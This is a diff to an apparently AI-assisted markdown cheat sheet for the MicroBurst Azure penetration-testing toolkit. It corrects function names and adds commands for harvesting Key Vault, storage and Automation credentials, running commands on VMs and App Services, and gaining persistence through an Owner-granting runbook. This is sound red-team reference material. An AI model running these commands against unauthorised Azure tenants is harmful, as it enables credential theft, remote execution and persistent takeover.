@@ -17,7 +17,7 @@ Connect-AzAccount
 
 > [!note] **MicroBurst vs AADInternals** — AADInternals focuses on Entra ID / identity attacks (users, tokens, PRT, AD Connect). MicroBurst focuses on Azure resource enumeration and credential harvesting from storage, Key Vault, app configs. Use both on Azure engagements.
 
-> [!warning] **Verified against the module (2026-08).** MicroBurst does **not** expose granular `Get-AzKeyVaultSecrets` / `Get-AzStorageKeys` / `Get-AzAppSecrets` / `Get-AzVMs` / `Get-AzPermissions` etc. — those were invented in older notes. Almost everything funnels through **two flagship functions**: `Get-AzPasswords` (all credential stores) and `Get-AzDomainInfo` (all resources). Confirm with `Get-Command -Module MicroBurst`.
+> [!warning] **Verified against the live repo (2026-09-27, function file names in `Az/`, `REST/`, `Misc/`).** The **Az-module** path has no granular `Get-AzKeyVaultSecrets`/`Get-AzStorageKeys`/`Get-AzAppSecrets`/`Get-AzPermissions` cmdlets — those were invented in older notes; it funnels through **`Get-AzPasswords`** (all credential stores) and **`Get-AzDomainInfo`** (all resources). **But the REST module (`MicroBurst-AzureREST`) *does* expose granular per-store grabbers** with a `REST` suffix: `Get-AzKeyVaultSecretsREST`, `Get-AzKeyVaultKeysREST`, `Get-AZStorageKeysREST`, `Get-AzAutomationAccountCredsREST`. Always confirm names with `Get-Command -Module MicroBurst*`.
 
 ---
 
@@ -31,11 +31,17 @@ Get-AzPasswords -Verbose
 Get-AzPasswords -Subscription <sub-id>          # scope to one subscription
 Get-AzPasswords -Verbose | Out-File creds.txt   # capture — output is long
 
-# Related credential grabbers
+# Related credential grabbers (all real, in Az/)
 Get-AzWebAppTokens               # managed-identity / app tokens from App Services
 Get-AzKeyVaultsAutomation        # Key Vault access via Automation account context
 Get-AzArcCertificates            # Azure Arc-connected machine certs
 Get-AzMachineLearningCredentials # AML workspace secrets
+Invoke-AzHybridWorkerExtraction  # creds/certs from an Automation Hybrid Runbook Worker
+
+# Granular REST-based grabbers (no Az module needed — MicroBurst-AzureREST)
+Get-AzKeyVaultSecretsREST
+Get-AZStorageKeysREST
+Get-AzAutomationAccountCredsREST
 ```
 
 ---
@@ -62,13 +68,19 @@ Invoke-AzVMCommandREST -Script "whoami"          # REST variant
 
 # App Service / Kudu command execution (webshell-equivalent on a web app)
 Invoke-AzAppServicesCMD -command "whoami" -appName <app-name>
-Invoke-AzAppServKuduCMDExec -appName <app-name>
+Invoke-AzAppServicesKuduDebug -appName <app-name>   # (real name — NOT "Invoke-AzAppServKuduCMDExec")
 
-# Run a rogue Automation runbook (exec as the Automation account's identity)
-Invoke-AzRunbook -Verbose
+# VM command exec via a DSC extension (alternative to RunCommand)
+Invoke-DscVmExtension
 
-# Azure Bastion shareable-link abuse (persistent RDP/SSH exposure)
+# Automation-account exec/persistence (there is NO "Invoke-AzRunbook" function):
+#   AutomationRunbook-OwnerPersist.ps1  — upload a runbook that grants Owner (persistence)
+#   KeyVaultRunBook.ps1                 — runbook that pulls Key Vault secrets
+#   Invoke-AzUADeploymentScript         — run code as a user-assigned managed identity (also privesc)
+
+# Azure Bastion shareable-link abuse (persistent RDP/SSH exposure) — REST module
 Get-AzRestBastionShareableLink
+Invoke-AzRESTBastionShareableLink
 ```
 
 ---
@@ -102,5 +114,5 @@ Invoke-EnumerateAzureSubDomains -Base <company-name>    # *.blob/file/table/queu
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-22*
+*Updated: 2026-09-27*
 *Model: claude-opus-4-8*
